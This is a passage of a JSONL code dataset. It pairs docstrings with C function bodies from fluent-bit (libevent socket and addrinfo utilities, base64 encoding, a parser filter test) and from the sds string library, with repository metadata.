sizeof(sin_out));\n\tmemset(&sin6_out, 0, sizeof(sin6_out));\n\n\t/* XXX some errnos mean 'no address'; some mean 'not enough sockets'. */\n\tif ((fd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP)) >= 0 &&\n\t    connect(fd, (struct sockaddr*)&sin, sizeof(sin)) == 0 &&\n\t    getsockname(fd, (struct sockaddr*)&sin_out, &sin_out_len) == 0) {\n\t\t/* We might have an IPv4 interface. */\n\t\tevutil_found_ifaddr((struct sockaddr*) &sin_out);\n\t}\n\tif (fd >= 0)\n\t\tevutil_closesocket(fd);\n\n\tif ((fd = socket(AF_INET6, SOCK_DGRAM, IPPROTO_UDP)) >= 0 &&\n\t    connect(fd, (struct sockaddr*)&sin6, sizeof(sin6)) == 0 &&\n\t    getsockname(fd, (struct sockaddr*)&sin6_out, &sin6_out_len) == 0) {\n\t\t/* We might have an IPv6 interface. */\n\t\tevutil_found_ifaddr((struct sockaddr*) &sin6_out);\n\t}\n\n\tif (fd >= 0)\n\t\tevutil_closesocket(fd);\n\n\treturn 0;\n}", "path": "fluent-bit/lib/monkey/mk_core/deps/libevent/evutil.c", "commit_date": "2016-12-21 00:00:00", "repo_name": "fluent/fluent-bit", "stars": 5221, "license": "apache-2.0", "language": "c", "size": 89495}
{"docstring": "/**\n   Read the contents of 'filename' into a newly allocated NUL-terminated\n   string.  Set *content_out to hold this string, and *len_out to hold its\n   length (not including the appended NUL).  If 'is_binary', open the file in\n   binary mode.\n\n   Returns 0 on success, -1 if the open fails, and -2 for all other failures.\n\n   Used internally only; may go away in a future version.\n */\n", "func_signal": "int\nevutil_read_file_(const char *filename, char **content_out, size_t *len_out,\n    int is_binary)", "code": "{\n\tint fd, r;\n\tstruct stat st;\n\tchar *mem;\n\tsize_t read_so_far=0;\n\tint mode = O_RDONLY;\n\n\tEVUTIL_ASSERT(content_out);\n\tEVUTIL_ASSERT(len_out);\n\t*content_out = NULL;\n\t*len_out = 0;\n\n#ifdef O_BINARY\n\tif (is_binary)\n\t\tmode |= O_BINARY;\n#endif\n\n\tfd = evutil_open_closeonexec_(filename, mode, 0);\n\tif (fd < 0)\n\t\treturn -1;\n\tif (fstat(fd, &st) || st.st_size < 0 ||\n\t    st.st_size > EV_SSIZE_MAX-1 ) {\n\t\tclose(fd);\n\t\treturn -2;\n\t}\n\tmem = mm_malloc((size_t)st.st_size + 1);\n\tif (!mem) {\n\t\tclose(fd);\n\t\treturn -2;\n\t}\n\tread_so_far = 0;\n#ifdef _WIN32\n#define N_TO_READ(x) ((x) > INT_MAX) ? INT_MAX : ((int)(x))\n#else\n#define N_TO_READ(x) (x)\n#endif\n\twhile ((r = read(fd, mem+read_so_far, N_TO_READ(st.st_size - read_so_far))) > 0) {\n\t\tread_so_far += r;\n\t\tif (read_so_far >= (size_t)st.st_size)\n\t\t\tbreak;\n\t\tEVUTIL_ASSERT(read_so_far < (size_t)st.st_size);\n\t}\n\tclose(fd);\n\tif (r < 0) {\n\t\tmm_free(mem);\n\t\treturn -2;\n\t}\n\tmem[read_so_far] = 0;\n\n\t*len_out = read_so_far;\n\t*content_out = mem;\n\treturn 0;\n}", "path": "fluent-bit/lib/monkey/mk_core/deps/libevent/evutil.c", "commit_date": "2016-12-21 00:00:00", "repo_name": "fluent/fluent-bit", "stars": 5221, "license": "apache-2.0", "language": "c", "size": 89495}
{"docstring": "/**\n * base64_encode - Base64 encode\n * @src: Data to be encoded\n * @len: Length of the data to be encoded\n * @out_len: Pointer to output length variable, or %NULL if not used\n * Returns: Allocated buffer of out_len bytes of encoded data,\n * or %NULL on failure\n *\n * Caller is responsible for freeing the returned buffer. Returned buffer is\n * nul terminated to make it easier to use as a C string. The nul terminator is\n * not included in out_len.\n */\n", "func_signal": "unsigned char * base64_encode(const unsigned char *src, size_t len,\n\t\t\t      size_t *out_len)", "code": "{\n\tunsigned char *out, *pos;\n\tconst unsigned char *end, *in;\n\tsize_t olen;\n\tint line_len;\n\n\tolen = len * 4 / 3 + 4; /* 3-byte blocks to 4-byte */\n\tolen += olen / 72; /* line feeds */\n\tolen++; /* nul termination */\n\tif (olen < len)\n\t\treturn NULL; /* integer overflow */\n\tif (mk_api != NULL) {\n\t\tout = __mem_alloc(olen);\n\t}\n\telse {\n                out = __mem_alloc(olen);\n        }\n\n\tif (out == NULL)\n\t\treturn NULL;\n\n\tend = src + len;\n\tin = src;\n\tpos = out;\n\tline_len = 0;\n\twhile (end - in >= 3) {\n\t\t*pos++ = base64_table[in[0] >> 2];\n\t\t*pos++ = base64_table[((in[0] & 0x03) << 4) | (in[1] >> 4)];\n\t\t*pos++ = base64_table[((in[1] & 0x0f) << 2) | (in[2] >> 6)];\n\t\t*pos++ = base64_table[in[2] & 0x3f];\n\t\tin += 3;\n\t\tline_len += 4;\n\t\tif (line_len >= 72) {\n\t\t\t*pos++ = '\\n';\n\t\t\tline_len = 0;\n\t\t}\n\t}\n\n\tif (end - in) {\n\t\t*pos++ = base64_table[in[0] >> 2];\n\t\tif (end - in == 1) {\n\t\t\t*pos++ = base64_table[(in[0] & 0x03) << 4];\n\t\t\t*pos++ = '=';\n\t\t} else {\n\t\t\t*pos++ = base64_table[((in[0] & 0x03) << 4) |\n\t\t\t\t\t      (in[1] >> 4)];\n\t\t\t*pos++ = base64_table[(in[1] & 0x0f) << 2];\n\t\t}\n\t\t*pos++ = '=';\n\t\tline_len += 4;\n\t}\n\n\tif (line_len)\n\t\t*pos++ = '\\n';\n\n\t*pos = '\\0';\n\tif (out_len)\n\t\t*out_len = pos - out;\n\treturn out;\n}", "path": "fluent-bit/lib/monkey/plugins/auth/base64.c", "commit_date": "2015-06-10 00:00:00", "repo_name": "fluent/fluent-bit", "stars": 5221, "license": "apache-2.0", "language": "c", "size": 89495}
{"docstring": "/* Faster version of evutil_make_socket_closeonexec for internal use.\n *\n * Requires that no F_SETFD flags were previously set on the fd.\n */\n", "func_signal": "static int\nevutil_fast_socket_closeonexec(evutil_socket_t fd)", "code": "{\n#if !defined(_WIN32) && defined(EVENT__HAVE_SETFD)\n\tif (fcntl(fd, F_SETFD, FD_CLOEXEC) == -1) {\n\t\tevent_warn(\"fcntl(%d, F_SETFD)\", fd);\n\t\treturn -1;\n\t}\n#endif\n\treturn 0;\n}", "path": "fluent-bit/lib/monkey/mk_core/deps/libevent/evutil.c", "commit_date": "2016-12-21 00:00:00", "repo_name": "fluent/fluent-bit", "stars": 5221, "license": "apache-2.0", "language": "c", "size": 89495}
{"docstring": "/* Wrapper around eventfd on systems that provide it.  Unlike the system\n * eventfd, it always supports EVUTIL_EFD_CLOEXEC and EVUTIL_EFD_NONBLOCK as\n * flags.  Returns -1 on error or if eventfd is not supported.\n */\n", "func_signal": "evutil_socket_t\nevutil_eventfd_(unsigned initval, int flags)", "code": "{\n#if defined(EVENT__HAVE_EVENTFD) && defined(EVENT__HAVE_SYS_EVENTFD_H)\n\tint r;\n#if defined(EFD_CLOEXEC) && defined(EFD_NONBLOCK)\n\tr = eventfd(initval, flags);\n\tif (r >= 0 || flags == 0)\n\t\treturn r;\n#endif\n\tr = eventfd(initval, 0);\n\tif (r < 0)\n\t\treturn r;\n\tif (flags & EVUTIL_EFD_CLOEXEC) {\n\t\tif (evutil_fast_socket_closeonexec(r) < 0) {\n\t\t\tevutil_closesocket(r);\n\t\t\treturn -1;\n\t\t}\n\t}\n\tif (flags & EVUTIL_EFD_NONBLOCK) {\n\t\tif (evutil_fast_socket_nonblocking(r) < 0) {\n\t\t\tevutil_closesocket(r);\n\t\t\treturn -1;\n\t\t}\n\t}\n\treturn r;\n#else\n\treturn -1;\n#endif\n}", "path": "fluent-bit/lib/monkey/mk_core/deps/libevent/evutil.c", "commit_date": "2016-12-21 00:00:00", "repo_name": "fluent/fluent-bit", "stars": 5221, "license": "apache-2.0", "language": "c", "size": 89495}
{"docstring": "// https://github.com/fluent/fluent-bit/issues/2250\n", "func_signal": "void flb_test_filter_parser_first_matched_when_mutilple_parser()", "code": "{\n    int ret;\n    int bytes;\n    char *p, *output, *expected;\n    flb_ctx_t *ctx;\n    int in_ffd;\n    int out_ffd;\n    int filter_ffd;\n    struct flb_parser *parser;\n\n    struct flb_lib_out_cb cb;\n    cb.cb   = callback_test;\n    cb.data = NULL;\n\n    ctx = flb_create();\n\n    /* Configure service */\n    flb_service_set(ctx, \"Flush\", \"1\", \"Grace\" \"1\", \"Log_Level\", \"debug\", NULL);\n\n    /* Input */\n    in_ffd = flb_input(ctx, (char *) \"lib\", NULL);\n    TEST_CHECK(in_ffd >= 0);\n    flb_input_set(ctx, in_ffd,\n                  \"Tag\", \"test\",\n                  NULL);\n\n    /* Parser */\n    parser = flb_parser_create(\"one\", \"regex\", \"^(?<one>.+?)$\",\n                               NULL, NULL, NULL, MK_FALSE, MK_TRUE,\n                               NULL, 0, NULL, ctx->config);\n    TEST_CHECK(parser != NULL);\n\n    parser = flb_parser_create(\"two\", \"regex\", \"^(?<two>.+?)$\",\n                               NULL, NULL, NULL, MK_FALSE, MK_TRUE,\n                               NULL, 0, NULL, ctx->config);\n    TEST_CHECK(parser != NULL);\n\n    /* Filter */\n    filter_ffd = flb_filter(ctx, (char *) \"parser\", NULL);\n    TEST_CHECK(filter_ffd >= 0);\n    ret = flb_filter_set(ctx, filter_ffd,\n                         \"Match\", \"test\",\n                         \"Key_Name\", \"data\",\n                         \"Parser\", \"one\",\n                         \"Parser\", \"two\",\n                         \"Reserve_Data\", \"On\",\n                         \"Preserve_Key\", \"On\",\n                         NULL);\n    TEST_CHECK(ret == 0);\n\n    /* Output */\n    out_ffd = flb_output(ctx, (char *) \"lib\", &cb);\n    TEST_CHECK(out_ffd >= 0);\n    flb_output_set(ctx, out_ffd,\n                   \"Match\", \"*\",\n                   \"format\", \"json\",\n                   NULL);\n\n    /* Start the engine */\n    ret = flb_start(ctx);\n    TEST_CHECK(ret == 0);\n\n    /* Ingest data */\n    p = \"[1,{\\\"data\\\":\\\"hoge\\\"}]\";\n    bytes = flb_lib_push(ctx, in_ffd, p, strlen(p));\n    TEST_CHECK(bytes == strlen(p));\n\n    sleep(1); /* waiting flush */\n    output = get_output(); /* 1sec passed, data should be flushed */\n    TEST_CHECK_(output != NULL, \"Expected output to not be NULL\");\n    if (output != NULL) {\n        /* check extra data was not preserved */\n        expected = \"\\\"one\\\":\\\"hoge\\\",\\\"data\\\":\\\"hoge\\\"\";\n        TEST_CHECK_(strstr(output, expected) != NULL, \"Expected output to contain key one , got '%s'\", output);\n        free(output);\n    }\n\n    flb_stop(ctx);\n    flb_destroy(ctx);\n}", "path": "fluent-bit/tests/runtime/filter_parser.c", "commit_date": "2020-11-27 00:00:00", "repo_name": "fluent/fluent-bit", "stars": 5221, "license": "apache-2.0", "language": "c", "size": 89495}
{"docstring": "/* Blocking read until receive 'count' bytes */\n", "func_signal": "ssize_t flb_pipe_read_all(int fd, void *buf, size_t count)", "code": "{\n    ssize_t bytes;\n    size_t total = 0;\n\n    do {\n        bytes = flb_pipe_r(fd, (char *) buf + total, count - total);\n        if (bytes == -1) {\n            if (FLB_PIPE_WOULDBLOCK()) {\n                /*\n                 * This could happen, since this function goal is not to\n                 * return until all data have been read, just sleep a little\n                 * bit (0.05 seconds)\n                 */\n                flb_time_msleep(50);\n                continue;\n            }\n            return -1;\n        }\n        else if (bytes == 0) {\n            /* Broken pipe ? */\n            flb_errno();\n            return -1;\n        }\n        total += bytes;\n\n    } while (total < count);\n\n    return total;\n}", "path": "fluent-bit/src/flb_pipe.c", "commit_date": "2020-09-29 00:00:00", "repo_name": "fluent/fluent-bit", "stars": 5221, "license": "apache-2.0", "language": "c", "size": 89495}
{"docstring": "/* Faster version of evutil_make_socket_nonblocking for internal use.\n *\n * Requires that no F_SETFL flags were previously set on the fd.\n */\n", "func_signal": "static int\nevutil_fast_socket_nonblocking(evutil_socket_t fd)", "code": "{\n#ifdef _WIN32\n\treturn evutil_make_socket_nonblocking(fd);\n#else\n\tif (fcntl(fd, F_SETFL, O_NONBLOCK) == -1) {\n\t\tevent_warn(\"fcntl(%d, F_SETFL)\", fd);\n\t\treturn -1;\n\t}\n\treturn 0;\n#endif\n}", "path": "fluent-bit/lib/monkey/mk_core/deps/libevent/evutil.c", "commit_date": "2016-12-21 00:00:00", "repo_name": "fluent/fluent-bit", "stars": 5221, "license": "apache-2.0", "language": "c", "size": 89495}
{"docstring": "/* If the EVUTIL_AI_ADDRCONFIG flag is set on hints->ai_flags, and\n * hints->ai_family is PF_UNSPEC, then revise the value of hints->ai_family so\n * that we'll only get addresses we could maybe connect to.\n */\n", "func_signal": "void\nevutil_adjust_hints_for_addrconfig_(struct evutil_addrinfo *hints)", "code": "{\n\tif (!(hints->ai_flags & EVUTIL_AI_ADDRCONFIG))\n\t\treturn;\n\tif (hints->ai_family != PF_UNSPEC)\n\t\treturn;\n\tif (!have_checked_interfaces)\n\t\tevutil_check_interfaces(0);\n\tif (had_ipv4_address && !had_ipv6_address) {\n\t\thints->ai_family = PF_INET;\n\t} else if (!had_ipv4_address && had_ipv6_address) {\n\t\thints->ai_family = PF_INET6;\n\t}\n}", "path": "fluent-bit/lib/monkey/mk_core/deps/libevent/evutil.c", "commit_date": "2016-12-21 00:00:00", "repo_name": "fluent/fluent-bit", "stars": 5221, "license": "apache-2.0", "language": "c", "size": 89495}
{"docstring": "/* This function is called when the plugin is loaded, it must\n * return\n */\n", "func_signal": "int mk_cheetah_plugin_init(struct plugin_api **api, char *confdir)", "code": "{\n    int ret;\n    mk_api = *api;\n    init_time = time(NULL);\n\n    ret = mk_cheetah_config(confdir);\n    return ret;\n}", "path": "fluent-bit/lib/monkey/plugins/cheetah/cheetah.c", "commit_date": "2017-10-12 00:00:00", "repo_name": "fluent/fluent-bit", "stars": 5221, "license": "apache-2.0", "language": "c", "size": 89495}
{"docstring": "/* Some older BSDs (like OpenBSD up to 4.6) used to believe that\n   giving a numeric port without giving an ai_socktype was verboten.\n   We test for this so we can apply an appropriate workaround.  If it\n   turns out that the bug is present, then:\n\n    - If nodename==NULL and servname is numeric, we build an answer\n      ourselves using evutil_getaddrinfo_common_().\n\n    - If nodename!=NULL and servname is numeric, then we set\n      servname=NULL when calling getaddrinfo, and post-process the\n      result to set the ports on it.\n\n   We test for this bug at runtime, since otherwise we can't have the\n   same binary run on multiple BSD versions.\n\n   - Some versions of Solaris believe that it's nice to leave to protocol\n     field set to 0.  We test for this so we can apply an appropriate\n     workaround.\n*/\n", "func_signal": "static struct evutil_addrinfo *ai_find_protocol(struct evutil_addrinfo *ai)", "code": "{\n\twhile (ai) {\n\t\tif (ai->ai_protocol)\n\t\t\treturn ai;\n\t\tai = ai->ai_next;\n\t}\n\treturn NULL;\n}", "path": "fluent-bit/lib/monkey/mk_core/deps/libevent/evutil.c", "commit_date": "2016-12-21 00:00:00", "repo_name": "fluent/fluent-bit", "stars": 5221, "license": "apache-2.0", "language": "c", "size": 89495}
{"docstring": "/* Helper: construct a new addrinfo containing the socket address in\n * 'sa', which must be a sockaddr_in or a sockaddr_in6.  Take the\n * socktype and protocol info from hints.  If they weren't set, then\n * allocate both a TCP and a UDP addrinfo.\n */\n", "func_signal": "struct evutil_addrinfo *\nevutil_new_addrinfo_(struct sockaddr *sa, ev_socklen_t socklen,\n    const struct evutil_addrinfo *hints)", "code": "{\n\tstruct evutil_addrinfo *res;\n\tEVUTIL_ASSERT(hints);\n\n\tif (hints->ai_socktype == 0 && hints->ai_protocol == 0) {\n\t\t/* Indecisive user! Give them a UDP and a TCP. */\n\t\tstruct evutil_addrinfo *r1, *r2;\n\t\tstruct evutil_addrinfo tmp;\n\t\tmemcpy(&tmp, hints, sizeof(tmp));\n\t\ttmp.ai_socktype = SOCK_STREAM; tmp.ai_protocol = IPPROTO_TCP;\n\t\tr1 = evutil_new_addrinfo_(sa, socklen, &tmp);\n\t\tif (!r1)\n\t\t\treturn NULL;\n\t\ttmp.ai_socktype = SOCK_DGRAM; tmp.ai_protocol = IPPROTO_UDP;\n\t\tr2 = evutil_new_addrinfo_(sa, socklen, &tmp);\n\t\tif (!r2) {\n\t\t\tevutil_freeaddrinfo(r1);\n\t\t\treturn NULL;\n\t\t}\n\t\tr1->ai_next = r2;\n\t\treturn r1;\n\t}\n\n\t/* We're going to allocate extra space to hold the sockaddr. */\n\tres = mm_calloc(1,sizeof(struct evutil_addrinfo)+socklen);\n\tif (!res)\n\t\treturn NULL;\n\tres->ai_addr = (struct sockaddr*)\n\t    (((char*)res) + sizeof(struct evutil_addrinfo));\n\tmemcpy(res->ai_addr, sa, socklen);\n\tres->ai_addrlen = socklen;\n\tres->ai_family = sa->sa_family; /* Same or not? XXX */\n\tres->ai_flags = EVUTIL_AI_LIBEVENT_ALLOCATED;\n\tres->ai_socktype = hints->ai_socktype;\n\tres->ai_protocol = hints->ai_protocol;\n\n\treturn res;\n}", "path": "fluent-bit/lib/monkey/mk_core/deps/libevent/evutil.c", "commit_date": "2016-12-21 00:00:00", "repo_name": "fluent/fluent-bit", "stars": 5221, "license": "apache-2.0", "language": "c", "size": 89495}
{"docstring": "/* Return a string corresponding to a protocol number that we can pass to\n * getservyname.  */\n", "func_signal": "static const char *\nevutil_unparse_protoname(int proto)", "code": "{\n\tswitch (proto) {\n\tcase 0:\n\t\treturn NULL;\n\tcase IPPROTO_TCP:\n\t\treturn \"tcp\";\n\tcase IPPROTO_UDP:\n\t\treturn \"udp\";\n#ifdef IPPROTO_SCTP\n\tcase IPPROTO_SCTP:\n\t\treturn \"sctp\";\n#endif\n\tdefault:\n#ifdef EVENT__HAVE_GETPROTOBYNUMBER\n\t\t{\n\t\t\tstruct protoent *ent = getprotobynumber(proto);\n\t\t\tif (ent)\n\t\t\t\treturn ent->p_name;\n\t\t}\n#endif\n\t\treturn NULL;\n\t}\n}", "path": "fluent-bit/lib/monkey/mk_core/deps/libevent/evutil.c", "commit_date": "2016-12-21 00:00:00", "repo_name": "fluent/fluent-bit", "stars": 5221, "license": "apache-2.0", "language": "c", "size": 89495}
{"docstring": "/* Internal function: Set fd[0] and fd[1] to a pair of fds such that writes on\n * fd[0] get read from fd[1].  Make both fds nonblocking and close-on-exec.\n * Return 0 on success, -1 on failure.\n */\n", "func_signal": "int\nevutil_make_internal_pipe_(evutil_socket_t fd[2])", "code": "{\n\t/*\n\t  Making the second socket nonblocking is a bit subtle, given that we\n\t  ignore any EAGAIN returns when writing to it, and you don't usally\n\t  do that for a nonblocking socket. But if the kernel gives us EAGAIN,\n\t  then there's no need to add any more data to the buffer, since\n\t  the main thread is already either about to wake up and drain it,\n\t  or woken up and in the process of draining it.\n\t*/\n\n#if defined(EVENT__HAVE_PIPE2)\n\tif (pipe2(fd, O_NONBLOCK|O_CLOEXEC) == 0)\n\t\treturn 0;\n#endif\n#if defined(EVENT__HAVE_PIPE)\n\tif (pipe(fd) == 0) {\n\t\tif (evutil_fast_socket_nonblocking(fd[0]) < 0 ||\n\t\t    evutil_fast_socket_nonblocking(fd[1]) < 0 ||\n\t\t    evutil_fast_socket_closeonexec(fd[0]) < 0 ||\n\t\t    evutil_fast_socket_closeonexec(fd[1]) < 0) {\n\t\t\tclose(fd[0]);\n\t\t\tclose(fd[1]);\n\t\t\tfd[0] = fd[1] = -1;\n\t\t\treturn -1;\n\t\t}\n\t\treturn 0;\n\t} else {\n\t\tevent_warn(\"%s: pipe\", __func__);\n\t}\n#endif\n\n#ifdef _WIN32\n#define LOCAL_SOCKETPAIR_AF AF_INET\n#else\n#define LOCAL_SOCKETPAIR_AF AF_UNIX\n#endif\n\tif (evutil_socketpair(LOCAL_SOCKETPAIR_AF, SOCK_STREAM, 0, fd) == 0) {\n\t\tif (evutil_fast_socket_nonblocking(fd[0]) < 0 ||\n\t\t    evutil_fast_socket_nonblocking(fd[1]) < 0 ||\n\t\t    evutil_fast_socket_closeonexec(fd[0]) < 0 ||\n\t\t    evutil_fast_socket_closeonexec(fd[1]) < 0) {\n\t\t\tevutil_closesocket(fd[0]);\n\t\t\tevutil_closesocket(fd[1]);\n\t\t\tfd[0] = fd[1] = -1;\n\t\t\treturn -1;\n\t\t}\n\t\treturn 0;\n\t}\n\tfd[0] = fd[1] = -1;\n\treturn -1;\n}", "path": "fluent-bit/lib/monkey/mk_core/deps/libevent/evutil.c", "commit_date": "2016-12-21 00:00:00", "repo_name": "fluent/fluent-bit", "stars": 5221, "license": "apache-2.0", "language": "c", "size": 89495}
{"docstring": "/* Internal helper function: act like evdns_getaddrinfo if dns_base is set;\n * otherwise do a blocking resolve and pass the result to the callback in the\n * way that evdns_getaddrinfo would.\n */\n", "func_signal": "struct evdns_getaddrinfo_request *evutil_getaddrinfo_async_(\n    struct evdns_base *dns_base,\n    const char *nodename, const char *servname,\n    const struct evutil_addrinfo *hints_in,\n    void (*cb)(int, struct evutil_addrinfo *, void *), void *arg)", "code": "{\n\tif (dns_base && evdns_getaddrinfo_impl) {\n\t\treturn evdns_getaddrinfo_impl(\n\t\t\tdns_base, nodename, servname, hints_in, cb, arg);\n\t} else {\n\t\tstruct evutil_addrinfo *ai=NULL;\n\t\tint err;\n\t\terr = evutil_getaddrinfo(nodename, servname, hints_in, &ai);\n\t\tcb(err, ai, arg);\n\t\treturn NULL;\n\t}\n}", "path": "fluent-bit/lib/monkey/mk_core/deps/libevent/evutil.c", "commit_date": "2016-12-21 00:00:00", "repo_name": "fluent/fluent-bit", "stars": 5221, "license": "apache-2.0", "language": "c", "size": 89495}
{"docstring": "/* Internal wrapper around 'accept' or 'accept4' to provide Linux-style\n * support for syscall-saving methods where available.\n *\n * In addition to regular accept behavior, you can set one or more of flags\n * EVUTIL_SOCK_NONBLOCK and EVUTIL_SOCK_CLOEXEC in the 'flags' argument, to\n * make the socket nonblocking or close-on-exec with as few syscalls as\n * possible.\n */\n", "func_signal": "evutil_socket_t\nevutil_accept4_(evutil_socket_t sockfd, struct sockaddr *addr,\n    ev_socklen_t *addrlen, int flags)", "code": "{\n\tevutil_socket_t result;\n#if defined(EVENT__HAVE_ACCEPT4) && defined(SOCK_CLOEXEC) && defined(SOCK_NONBLOCK)\n\tresult = accept4(sockfd, addr, addrlen, flags);\n\tif (result >= 0 || (errno != EINVAL && errno != ENOSYS)) {\n\t\t/* A nonnegative result means that we succeeded, so return.\n\t\t * Failing with EINVAL means that an option wasn't supported,\n\t\t * and failing with ENOSYS means that the syscall wasn't\n\t\t * there: in those cases we want to fall back.  Otherwise, we\n\t\t * got a real error, and we should return. */\n\t\treturn result;\n\t}\n#endif\n\tresult = accept(sockfd, addr, addrlen);\n\tif (result < 0)\n\t\treturn result;\n\n\tif (flags & EVUTIL_SOCK_CLOEXEC) {\n\t\tif (evutil_fast_socket_closeonexec(result) < 0) {\n\t\t\tevutil_closesocket(result);\n\t\t\treturn -1;\n\t\t}\n\t}\n\tif (flags & EVUTIL_SOCK_NONBLOCK) {\n\t\tif (evutil_fast_socket_nonblocking(result) < 0) {\n\t\t\tevutil_closesocket(result);\n\t\t\treturn -1;\n\t\t}\n\t}\n\treturn result;\n}", "path": "fluent-bit/lib/monkey/mk_core/deps/libevent/evutil.c", "commit_date": "2016-12-21 00:00:00", "repo_name": "fluent/fluent-bit", "stars": 5221, "license": "apache-2.0", "language": "c", "size": 89495}
{"docstring": "/* Check whether a socket on which we called connect() is done\n   connecting. Return 1 for connected, 0 for not yet, -1 for error.  In the\n   error case, set the current socket errno to the error that happened during\n   the connect operation. */\n", "func_signal": "int\nevutil_socket_finished_connecting_(evutil_socket_t fd)", "code": "{\n\tint e;\n\tev_socklen_t elen = sizeof(e);\n\n\tif (getsockopt(fd, SOL_SOCKET, SO_ERROR, (void*)&e, &elen) < 0)\n\t\treturn -1;\n\n\tif (e) {\n\t\tif (EVUTIL_ERR_CONNECT_RETRIABLE(e))\n\t\t\treturn 0;\n\t\tEVUTIL_SET_SOCKET_ERROR(e);\n\t\treturn -1;\n\t}\n\n\treturn 1;\n}", "path": "fluent-bit/lib/monkey/mk_core/deps/libevent/evutil.c", "commit_date": "2016-12-21 00:00:00", "repo_name": "fluent/fluent-bit", "stars": 5221, "license": "apache-2.0", "language": "c", "size": 89495}
{"docstring": "/* Helper for systems with no getaddrinfo(): make one or more addrinfos out of\n * a struct hostent.\n */\n", "func_signal": "static struct evutil_addrinfo *\naddrinfo_from_hostent(const struct hostent *ent,\n    int port, const struct evutil_addrinfo *hints)", "code": "{\n\tint i;\n\tstruct sockaddr_in sin;\n\tstruct sockaddr_in6 sin6;\n\tstruct sockaddr *sa;\n\tint socklen;\n\tstruct evutil_addrinfo *res=NULL, *ai;\n\tvoid *addrp;\n\n\tif (ent->h_addrtype == PF_INET) {\n\t\tmemset(&sin, 0, sizeof(sin));\n\t\tsin.sin_family = AF_INET;\n\t\tsin.sin_port = htons(port);\n\t\tsa = (struct sockaddr *)&sin;\n\t\tsocklen = sizeof(struct sockaddr_in);\n\t\taddrp = &sin.sin_addr;\n\t\tif (ent->h_length != sizeof(sin.sin_addr)) {\n\t\t\tevent_warnx(\"Weird h_length from gethostbyname\");\n\t\t\treturn NULL;\n\t\t}\n\t} else if (ent->h_addrtype == PF_INET6) {\n\t\tmemset(&sin6, 0, sizeof(sin6));\n\t\tsin6.sin6_family = AF_INET6;\n\t\tsin6.sin6_port = htons(port);\n\t\tsa = (struct sockaddr *)&sin6;\n\t\tsocklen = sizeof(struct sockaddr_in6);\n\t\taddrp = &sin6.sin6_addr;\n\t\tif (ent->h_length != sizeof(sin6.sin6_addr)) {\n\t\t\tevent_warnx(\"Weird h_length from gethostbyname\");\n\t\t\treturn NULL;\n\t\t}\n\t} else\n\t\treturn NULL;\n\n\tfor (i = 0; ent->h_addr_list[i]; ++i) {\n\t\tmemcpy(addrp, ent->h_addr_list[i], ent->h_length);\n\t\tai = evutil_new_addrinfo_(sa, socklen, hints);\n\t\tif (!ai) {\n\t\t\tevutil_freeaddrinfo(res);\n\t\t\treturn NULL;\n\t\t}\n\t\tres = evutil_addrinfo_append_(res, ai);\n\t}\n\n\tif (res && ((hints->ai_flags & EVUTIL_AI_CANONNAME) && ent->h_name)) {\n\t\tres->ai_canonname = mm_strdup(ent->h_name);\n\t\tif (res->ai_canonname == NULL) {\n\t\t\tevutil_freeaddrinfo(res);\n\t\t\treturn NULL;\n\t\t}\n\t}\n\n\treturn res;\n}", "path": "fluent-bit/lib/monkey/mk_core/deps/libevent/evutil.c", "commit_date": "2016-12-21 00:00:00", "repo_name": "fluent/fluent-bit", "stars": 5221, "license": "apache-2.0", "language": "c", "size": 89495}
{"docstring": "/* Return the total size of the allocation of the specified sds string,\n * including:\n * 1) The sds header before the pointer.\n * 2) The string.\n * 3) The free buffer at the end if any.\n * 4) The implicit null term.\n */\n", "func_signal": "size_t sdsAllocSize(sds s)", "code": "{\n    size_t alloc = sdsalloc(s);\n    return sdsHdrSize(s[-1])+alloc+1;\n}", "path": "sds/sds.c", "commit_date": "2019-11-26 00:00:00", "repo_name": "antirez/sds", "stars": 4725, "license": "bsd-2-clause", "language": "c", "size": 84}
{"docstring": "/* Join an array of C strings using the specified separator (also a C string).\n * Returns the result as an sds string. */\n", "func_signal": "sds sdsjoin(char **argv, int argc, char *sep)", "code": "{\n    sds join = sdsempty();\n    int j;\n\n    for (j = 0; j < argc; j++) {\n        join = sdscat(join, argv[j]);\n        if (j != argc-1) join = sdscat(join,sep);\n    }\n    return join;\n}", "path": "sds/sds.c", "commit_date": "2019-11-26 00:00:00", "repo_name": "antirez/sds", "stars": 4725, "license": "bsd-2-clause", "language": "c", "size": 84}
{"docstring": "/* Compare two sds strings s1 and s2 with memcmp().\n *\n * Return value:\n *\n *     positive if s1 > s2.\n *     negative if s1 < s2.\n *     0 if s1 and s2 are exactly the same binary string.\n *\n * If two strings share exactly the same prefix, but one of the two has\n * additional characters, the longer string is considered to be greater than\n * the smaller one. */\n", "func_signal": "int sdscmp(const sds s1, const sds s2)", "code": "{\n    size_t l1, l2, minlen;\n    int cmp;\n\n    l1 = sdslen(s1);\n    l2 = sdslen(s2);\n    minlen = (l1 < l2) ? l1 : l2;\n    cmp = memcmp(s1,s2,minlen);\n    if (cmp == 0) return l1>l2? 1: (l1<l2? -1: 0);\n    return cmp;\n}", "path": "sds/sds.c", "commit_date": "2019-11-26 00:00:00", "repo_name": "antirez/sds", "stars": 4725, "license": "bsd-2-clause", "language": "c", "size": 84}
{"docstring": "/* Destructively modify the sds string 's' to hold the specified binary\n * safe string pointed by 't' of length 'len' bytes. */\n", "func_signal": "sds sdscpylen(sds s, const char *t, size_t len)", "code": "{\n    if (sdsalloc(s) < len) {\n        s = sdsMakeRoomFor(s,len-sdslen(s));\n        if (s == NULL) return NULL;\n    }\n    memcpy(s, t, len);\n    s[len] = '\\0';\n    sdssetlen(s, len);\n    return s;\n}", "path": "sds/sds.c", "commit_date": "2019-11-26 00:00:00", "repo_name": "antirez/sds", "stars": 4725, "license": "bsd-2-clause", "language": "c", "size": 84}
{"docstring": "/* Append to the sds string 's' a string obtained using printf-alike format\n * specifier.\n *\n * After the call, the modified sds string is no longer valid and all the\n * references must be substituted with the new pointer returned by the call.\n *\n * Example:\n *\n * s = sdsnew(\"Sum is: \");\n * s = sdscatprintf(s,\"%d+%d = %d\",a,b,a+b).\n *\n * Often you need to create a string from scratch with the printf-alike\n * format. When this is the need, just use sdsempty() as the target string:\n *\n * s = sdscatprintf(sdsempty(), \"... your format ...\", args);\n */\n", "func_signal": "sds sdscatprintf(sds s, const char *fmt, ...)", "code": "{\n    va_list ap;\n    char *t;\n    va_start(ap, fmt);\n    t = sdscatvprintf(s,fmt,ap);\n    va_end(ap);\n    return t;\n}", "path": "sds/sds.c", "commit_date": "2019-11-26 00:00:00", "repo_name": "antirez/sds", "stars": 4725, "license": 